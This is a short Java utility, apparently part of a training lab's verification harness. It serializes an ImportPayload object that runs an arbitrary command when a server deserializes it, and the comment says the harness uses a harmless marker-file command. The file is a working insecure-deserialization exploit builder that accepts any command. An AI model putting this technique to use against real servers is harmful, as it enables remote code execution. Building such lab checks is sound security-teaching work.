import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Path;

import com.securebank.labs.a08.ImportPayload;

/**
 * Serialize an ImportPayload to a file.
 *
 * <p>Usage:
 *     javac -cp target/classes -d &lt;dir&gt; verify/payloads/MakeImportPayload.java
 *     java -cp target/classes:&lt;dir&gt; MakeImportPayload &lt;out.bin&gt; &lt;command&gt;
 *
 * <p>The command is executed by the payload's readObject when the server
 * deserializes it. The harness uses a command that touches a marker file, so
 * the exploit is proven by the filesystem rather than by the response body.
 */
public final class MakeImportPayload {

    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("usage: MakeImportPayload <out.bin> <command>");
            System.exit(2);
        }
        Path out = Path.of(args[0]);
        String command = args[1];

        ImportPayload payload = new ImportPayload(command, out.toString());

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out.toFile()))) {
            oos.writeObject(payload);
        }
        System.out.println("wrote " + out.toAbsolutePath() + " (" + out.toFile().length() + " bytes)");
    }
}
